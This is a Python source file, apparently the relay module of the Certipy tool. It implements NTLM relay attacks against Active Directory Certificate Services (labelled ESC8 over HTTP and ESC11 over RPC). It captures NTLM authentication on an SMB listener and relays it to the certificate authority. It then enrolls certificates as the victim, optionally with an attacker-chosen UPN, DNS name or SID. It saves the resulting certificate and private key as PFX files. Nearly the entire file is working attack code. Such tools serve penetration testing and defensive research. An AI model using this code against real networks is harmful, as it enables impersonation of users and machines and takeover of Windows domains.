import argparse
import base64
import os
import re
import time
import traceback
import urllib.parse
from struct import unpack
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.examples.ntlmrelayx.clients import rpcrelayclient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.dcerpc.v5 import epm

from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    create_csr,
    create_pfx,
    csr_to_der,
    csr_to_pem,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    key_to_pem,
    pem_to_cert,
    pem_to_key,
    rsa,
    x509,
)
from certipy.lib.errors import translate_error_code
from certipy.lib.formatting import print_certificate_identifications
from certipy.lib.logger import logging
from certipy.commands.req import MSRPC_UUID_ICPR, RPCRequestInterface

try:
    from http.client import HTTPConnection
except ImportError:
    from httplib import HTTPConnection


class ADCSHTTPRelayServer(HTTPRelayClient):
    def initConnection(self):
        logging.debug("Connecting to %s:%s..." % (self.targetHost, self.targetPort))
        self.session = HTTPConnection(
            self.targetHost, self.targetPort, timeout=self.adcs_relay.timeout
        )
        self.session.connect()
        logging.debug("Connected to %s:%s" % (self.targetHost, self.targetPort))
        self.lastresult = None
        if self.target.path == "":
            self.path = "/"
        else:
            self.path = self.target.path
        return True

    def sendAuth(self, *args, **kwargs):
        self.adcs_relay.attack_lock.acquire()
        try:
            response = self._sendAuth(*args, **kwargs)
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.adcs_relay.attack_lock.release()
            return response

    def _sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(data=token)

            domain = response["domain_name"].decode("utf-16le")
            username = response["user_name"].decode("utf-16le")

            self.session.user = "%s\\%s" % (domain, username)

            print(self.session.user)

            auth = base64.b64encode(token).decode("ascii")
            headers = {"Authorization": "%s %s" % (self.authenticationMethod, auth)}
            self.session.request("GET", self.path, headers=headers)
            res = self.session.getresponse()

            if res.status == 401:
                logging.error("Got unauthorized response from AD CS")
                return None, STATUS_ACCESS_DENIED
            else:
                logging.debug(
                    "HTTP server returned error code %d, treating as a successful login"
                    % res.status
                )
                # Cache this
                self.lastresult = res.read()
                return None, STATUS_SUCCESS
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")


class ADCSRPCRelayServer(rpcrelayclient.RPCRelayClient, rpcrelayclient.ProtocolClient):
    def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
        rpcrelayclient.ProtocolClient.__init__(
            self, serverConfig, target, targetPort, extendedSecurity
        )

        self.endpoint = "ICPR"

        self.endpoint_uuid = MSRPC_UUID_ICPR

        logging.info(
            "Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding"
            % (target.netloc, self.endpoint)
        )
        self.stringbinding = epm.hept_map(
            target.netloc, self.endpoint_uuid, protocol="ncacn_ip_tcp"
        )

        logging.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            auth_data = respToken2["ResponseToken"]
        else:
            auth_data = authenticateMessageBlob

        self.session.sendBindType3(auth_data)

        try:
            req = rpcrelayclient.DummyOp()
            self.session.request(req)
        except rpcrelayclient.DCERPCException as e:
            if "nca_s_op_rng_error" in str(e) or "RPC_E_INVALID_HEADER" in str(e):
                return None, STATUS_SUCCESS
            elif "rpc_s_access_denied" in str(e):
                return None, STATUS_ACCESS_DENIED
            else:
                logging.info(
                    "Unexpected rpc code received from %s: %s"
                    % (self.stringbinding, str(e))
                )
                return None, STATUS_ACCESS_DENIED

    def killConnection(self):
        if self.session is not None:
            self.session.get_rpc_transport().disconnect()
            self.session = None

    def keepAlive(self):
        try:
            req = rpcrelayclient.DummyOp()
            self.session.request(req)
        except rpcrelayclient.DCERPCException as e:
            if "nca_s_op_rng_error" not in str(e) or "RPC_E_INVALID_HEADER" not in str(
                e
            ):
                raise


class ADCSHTTPAttackClient(ProtocolAttack):
    def run(self):
        self.adcs_relay.attack_lock.acquire()
        try:
            self._run()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self):
        if (
            not self.adcs_relay.no_skip
            and self.client.user in self.adcs_relay.attacked_targets
        ):
            logging.debug(
                "Skipping user %s since attack was already performed"
                % repr(self.client.user)
            )
            return

        request_id = self.adcs_relay.request_id
        if request_id:
            self.client.request("GET", "/certsrv/certnew.cer?ReqID=%d" % request_id)

            response = self.client.getresponse()
            content = response.read()

            if response.status != 200:
                logging.error("Got error while requesting certificate")
                if self.adcs_relay.verbose:
                    logging.warning("Got error while trying to request certificate:")
                    print(content)
                else:
                    logging.warning(
                        "Got error while trying to request certificate. Use -debug to print the response"
                    )
                return

            if b"BEGIN CERTIFICATE" in content:
                cert = pem_to_cert(content)
            else:
                content = content.decode()
                if "Taken Under Submission" in content:
                    logging.warning("Certificate request is still pending approval")
                elif "The requested property value is empty" in content:
                    logging.warning("Unknown request ID %d" % request_id)
                else:
                    error_code = re.findall(r" (0x[0-9a-fA-F]+) \(", content)
                    try:
                        error_code = int(error_code[0], 16)
                        msg = translate_error_code(error_code)
                        logging.warning("Got error from AD CS: %s" % msg)
                    except:
                        logging.warning("Got unknown error from AD CS:")
                        if self.adcs_relay.verbose:
                            print(content)
                        else:
                            logging.warning("Use -debug to print the response")

                return self.finish_run()

            return self.save_certificate(cert, request_id=request_id)

        template = self.config.template

        if template is None:
            template = "Machine" if self.username.endswith("$") else "User"

        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.dns,
            alt_upn=self.adcs_relay.upn,
            alt_sid=self.adcs_relay.sid,
            key_size=self.adcs_relay.key_size,
        )

        csr = csr_to_pem(csr).decode()

        attributes = ["CertificateTemplate:%s" % template]

        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
            san = []
            if self.adcs_relay.dns:
                san.append("dns=%s" % self.adcs_relay.dns)
            if self.adcs_relay.upn:
                san.append("upn=%s" % self.adcs_relay.upn)

            attributes.append("SAN:%s" % "&".join(san))

        attributes = "\n".join(attributes)

        params = {
            "Mode": "newreq",
            "CertAttrib": attributes,
            "CertRequest": csr,
            "TargetStoreFlags": "0",
            "SaveCert": "yes",
            "ThumbPrint": "",
        }

        data = urllib.parse.urlencode(params)

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data),
        }

        logging.info(
            "Requesting certificate for %s based on the template %s"
            % (repr(self.client.user), repr(template))
        )

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()
        content = response.read().decode()

        if response.status != 200:
            logging.error("Got error while requesting certificate")
            if self.adcs_relay.verbose:
                print(content)
            else:
                logging.warning("Use -debug to print the response")
            return

        request_id = re.findall(r"certnew.cer\?ReqID=([0-9]+)&", content)
        if not request_id:
            if "template that is not supported" in content:
                logging.error("Template %s is not supported by AD CS" % repr(template))
                return
            else:
                if "Certificate Pending" in content:
                    logging.warning("Certificate request is pending approval")
                elif '"Denied by Policy Module"' in content:
                    logging.warning(
                        "Got access denied while trying to enroll in template %s"
                        % repr(template)
                    )
                else:
                    error_code = re.findall(
                        r"Denied by Policy Module  (0x[0-9a-fA-F]+),", content
                    )
                    try:
                        error_code = int(error_code[0], 16)
                        msg = translate_error_code(error_code)
                        logging.warning("Got error from AD CS: %s" % msg)
                    except:
                        logging.warning("Got unknown error from AD CS:")
                        if self.adcs_relay.verbose:
                            print(content)
                        else:
                            logging.warning("Use -debug to print the response")

            request_id = re.findall(r"Your Request Id is ([0-9]+)", content)
            if len(request_id) != 1:
                logging.error("Failed to get request id from response")
                return

            request_id = int(request_id[0])

            logging.info("Request ID is %d" % request_id)

            should_save = input(
                "Would you like to save the private key? (y/N) "
            ).rstrip("\n")

            if should_save.lower() == "y":
                with open("%d.key" % request_id, "wb") as f:
                    f.write(key_to_pem(key))

                logging.info("Saved private key to %d.key" % request_id)

            return self.finish_run()

        if len(request_id) == 0:
            logging.error("Failed to get request id from response")
            return

        request_id = int(request_id[0])

        self.client.request("GET", "/certsrv/certnew.cer?ReqID=%d" % request_id)
        response = self.client.getresponse()

        content = response.read()
        cert = pem_to_cert(content)

        return self.save_certificate(cert, key=key, request_id=request_id)

    def finish_run(self):
        self.adcs_relay.attacked_targets.append(self.client.user)
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()

    def save_certificate(
        self,
        cert: x509.Certificate,
        key: rsa.RSAPrivateKey = None,
        request_id: int = None,
    ):
        identifications = get_identifications_from_certificate(cert)

        print_certificate_identifications(identifications)

        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info("Certificate object SID is %s" % repr(object_sid))
        else:
            logging.info("Certificate has no object SID")

        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)
            if out is None:
                out = str(request_id)

            out = out.rstrip("$").lower()

        if key is None:
            try:
                with open("%d.key" % request_id, "rb") as f:
                    key = pem_to_key(f.read())
            except Exception as e:
                logging.warning(
                    "Could not find matching private key. Saving certificate as PEM"
                )
                with open("%s.crt" % out, "wb") as f:
                    f.write(cert_to_pem(cert))

                logging.info("Saved certificate to %s" % repr("%s.crt" % out))
            else:
                logging.info("Loaded private key from %s" % repr("%d.key" % request_id))
                pfx = create_pfx(key, cert)
                with open("%s.pfx" % out, "wb") as f:
                    f.write(pfx)
                logging.info(
                    "Saved certificate and private key to %s" % repr("%s.pfx" % out)
                )
        else:
            pfx = create_pfx(key, cert)

            with open("%s.pfx" % out, "wb") as f:
                f.write(pfx)

                logging.info(
                    "Saved certificate and private key to %s" % repr("%s.pfx" % out)
                )

        self.finish_run()


class ADCSRPCAttackClient(ProtocolAttack):
    def __init__(self, config, dce, username):
        super().__init__(config, dce, username)

        self.dce = dce
        self.rpctransport = dce.get_rpc_transport()
        self.stringbinding = self.rpctransport.get_stringbinding()

        try:
            if "/" in username:
                self.domain, self.username = username.split("/")
            else:
                self.domain, self.username = "Unknown", username
        except Exception as e:
            print("Got error", e)

    def run(self):
        self.adcs_relay.attack_lock.acquire()

        self.interface = RPCRequestInterface(parent=self.adcs_relay)
        self.interface._dce = self.dce

        try:
            self._run()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.adcs_relay.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")
        finally:
            self.adcs_relay.attack_lock.release()

    def _run(self):
        if (
            not self.adcs_relay.no_skip
            and (self.username + "@" + self.domain) in self.adcs_relay.attacked_targets
        ):
            logging.info(
                "Skipping user %s since attack was already performed"
                % repr(self.username + "@" + self.domain)
            )
            return

        logging.info("Attacking user %s" % repr(self.username + "@" + self.domain))

        request_id = self.adcs_relay.request_id
        if request_id:
            self.retrieve()
        else:
            self.request()

        self.finish_run()

    def retrieve(self) -> bool:
        request_id = int(self.adcs_relay.request_id)

        logging.info("Retrieving certificate for request id %d" % request_id)

        cert = self.interface.retrieve(request_id)
        if cert is False:
            logging.error("Failed to retrieve certificate")
            return False

        identifications = get_identifications_from_certificate(cert)

        print_certificate_identifications(identifications)

        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info("Certificate object SID is %s" % repr(object_sid))
        else:
            logging.info("Certificate has no object SID")

        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)
            if out is None:
                out = self.username

            out = out.rstrip("$").lower()

        try:
            with open("%d.key" % request_id, "rb") as f:
                key = pem_to_key(f.read())
        except Exception as e:
            logging.warning(
                "Could not find matching private key. Saving certificate as PEM"
            )
            with open("%s.crt" % out, "wb") as f:
                f.write(cert_to_pem(cert))

            logging.info("Saved certificate to %s" % repr("%s.crt" % out))
        else:
            logging.info("Loaded private key from %s" % repr("%d.key" % request_id))
            pfx = create_pfx(key, cert)
            with open("%s.pfx" % out, "wb") as f:
                f.write(pfx)
            logging.info(
                "Saved certificate and private key to %s" % repr("%s.pfx" % out)
            )

        return True

    def request(self) -> bool:
        template = self.config.template

        if template is None:
            logging.info("Template was not defined. Defaulting to Machine/User")
            template = "Machine" if self.username.endswith("$") else "User"

        logging.info(
            "Requesting certificate for user %s with template %s"
            % (repr(self.username), repr(template))
        )

        csr, key = create_csr(
            self.username,
            alt_dns=self.adcs_relay.dns,
            alt_upn=self.adcs_relay.upn,
            key_size=self.adcs_relay.key_size,
        )
        self.key = key
        self.adcs_relay.key = key

        csr = csr_to_der(csr)

        attributes = ["CertificateTemplate:%s" % template]

        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
            san = []
            if self.adcs_relay.dns:
                san.append("dns=%s" % self.adcs_relay.dns)
            if self.adcs_relay.upn:
                san.append("upn=%s" % self.adcs_relay.upn)

            attributes.append("SAN:%s" % "&".join(san))

        cert = self.interface.request(csr, attributes)

        if cert is False:
            logging.error("Failed to request certificate")
            return False

        identifications = get_identifications_from_certificate(cert)

        print_certificate_identifications(identifications)

        object_sid = get_object_sid_from_certificate(cert)
        if object_sid is not None:
            logging.info("Certificate object SID is %s" % repr(object_sid))
        else:
            logging.info("Certificate has no object SID")

        out = self.adcs_relay.out
        if out is None:
            out, _ = cert_id_to_parts(identifications)
            if out is None:
                out = self.username

            out = out.rstrip("$").lower()

        pfx = create_pfx(key, cert)

        outfile = "%s.pfx" % out

        with open(outfile, "wb") as f:
            f.write(pfx)

        logging.info("Saved certificate and private key to %s" % repr(outfile))

        return pfx, outfile

    def finish_run(self):
        self.adcs_relay.attacked_targets.append(self.username + "@" + self.domain)
        if not self.adcs_relay.forever:
            self.adcs_relay.shutdown()


class Relay:
    def __init__(
        self,
        target,
        ca=None,
        template=None,
        upn=None,
        dns=None,
        sid=None,
        retrieve=None,
        key_size: int = 2048,
        out=None,
        interface="0.0.0.0",
        port=445,
        forever=False,
        no_skip=False,
        timeout=5,
        debug=False,
        **kwargs
    ):
        self.target = target
        self.ca = ca
        self.template = template
        self.upn = upn
        self.dns = dns
        self.sid = sid
        self.request_id = int(retrieve)
        self.key_size = key_size
        self.out = out
        self.forever = forever
        self.no_skip = no_skip
        self.timeout = timeout
        self.verbose = debug
        self.interface = interface
        self.port = port
        self.kwargs = kwargs

        self.attacked_targets = []
        self.attack_lock = Lock()

        if self.target.startswith("rpc://"):
            if ca is None:
                logging.error("A certificate authority is required for RPC attacks")
                exit(1)

            logging.info("Targeting %s (ESC11)" % target)
        else:
            if not self.target.startswith("http://"):
                self.target = "http://%s" % self.target
            if not self.target.endswith("/certsrv/certfnsh.asp"):
                if not self.target.endswith("/"):
                    self.target += "/"
                self.target += "certsrv/certfnsh.asp"
            logging.info("Targeting %s (ESC8)" % self.target)

        target = TargetsProcessor(
            singleTarget=self.target, protocolClients={"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
        )

        config = NTLMRelayxConfig()
        config.setTargets(target)
        config.setIsADCSAttack(True)
        config.setADCSOptions(self.template)
        config.setAttacks(
            {"HTTP": self.get_attack_http_client, "RPC": self.get_attack_rpc_client}
        )
        config.setProtocolClients(
            {"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
        )
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    def start(self):
        logging.info("Listening on %s:%d" % (self.interface, self.port))

        self.server.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
            self.shutdown()
        except Exception as e:
            logging.error("Got error: %s" % e)
            if self.verbose:
                traceback.print_exc()
            else:
                logging.error("Use -debug to print a stacktrace")

    def get_relay_http_server(self, *args, **kwargs) -> ADCSHTTPRelayServer:
        relay_server = ADCSHTTPRelayServer(*args, **kwargs)
        relay_server.adcs_relay = self
        return relay_server

    def get_attack_http_client(self, *args, **kwargs) -> ADCSHTTPAttackClient:
        attack_client = ADCSHTTPAttackClient(*args, **kwargs)
        attack_client.adcs_relay = self
        return attack_client

    def get_relay_rpc_server(self, *args, **kwargs) -> ADCSRPCRelayServer:
        relay_server = ADCSRPCRelayServer(*args, **kwargs)
        relay_server.adcs_relay = self
        return relay_server

    def get_attack_rpc_client(self, *args, **kwargs) -> ADCSRPCAttackClient:
        attack_client = ADCSRPCAttackClient(*args, **kwargs)
        attack_client.adcs_relay = self
        return attack_client

    def shutdown(self):
        logging.info("Exiting...")
        os._exit(0)


def entry(options: argparse.Namespace) -> None:
    relay = Relay(**vars(options))
    relay.start()
